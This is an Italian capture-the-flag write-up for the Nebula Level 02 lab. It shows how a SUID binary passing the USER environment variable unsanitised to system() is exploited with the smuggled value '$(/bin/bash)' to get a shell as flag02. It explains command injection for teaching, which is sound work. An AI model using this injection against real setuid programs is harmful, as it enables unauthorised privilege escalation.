## 🧨 Nebula – Level 02

**Obiettivo**: ottenere i privilegi dell'utente `flag02` sfruttando una vulnerabilità nell'eseguibile `flag02`.

---

### 📂 Informazioni iniziali

```bash
level02@nebula:/home/flag02$ ls -l
-rwsr-x--- 1 flag02 level02 7438 ... flag02
```

🔐 Il binario `flag02` ha il **bit SUID** attivo → se lo eseguiamo, i comandi lanciati al suo interno vengono eseguiti con i privilegi di `flag02`.

---

### 🔍 Analisi statica (`objdump`)

La funzione `main()` contiene il seguente comportamento chiave:

```c
asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
printf("about to call system(\"%s\")\n", buffer);
system(buffer);
```

🧠 L'eseguibile:

* recupera il contenuto della variabile d'ambiente `USER`
* la inserisce in una stringa con `asprintf()`
* la passa a `system()` (che invoca `/bin/sh -c <string>`)

---

### ❗ Vulnerabilità

La chiamata a `system()` usa direttamente l'input utente da una variabile d’ambiente **senza sanitizzazione** → possiamo iniettarci comandi arbitrari.

---

### 🧪 Tentativi iniziali

```bash
export USER=getflag
./flag02
# output: about to call system("/bin/echo getflag is cool")
```

😓 Ma: `getflag` viene eseguito con il nostro utente (`level02`), quindi non otteniamo nulla.

---

### ✅ Exploit

Passiamo un **comando secondario** dentro `USER`, che verrà eseguito **dall'interno** del comando `echo`:

```bash
export USER='$(/bin/bash)'
./flag02
```

🔓 Questo esegue una shell come `flag02`!

```bash
flag02@nebula:/home/flag02$ whoami
flag02
flag02@nebula:/home/flag02$ getflag
flag02 You have successfully executed getflag on a target account
```

---

### 🏁 Soluzione finale

```bash
export USER='$(/bin/bash)'
./flag02
# Entra in shell con i privilegi di flag02
getflag
```

---

### 💡 Lezione appresa

L'uso non sicuro di `system()` con input non sanitizzato può **esporre l'interprete di shell a code injection**, anche tramite variabili d'ambiente apparentemente innocue.

---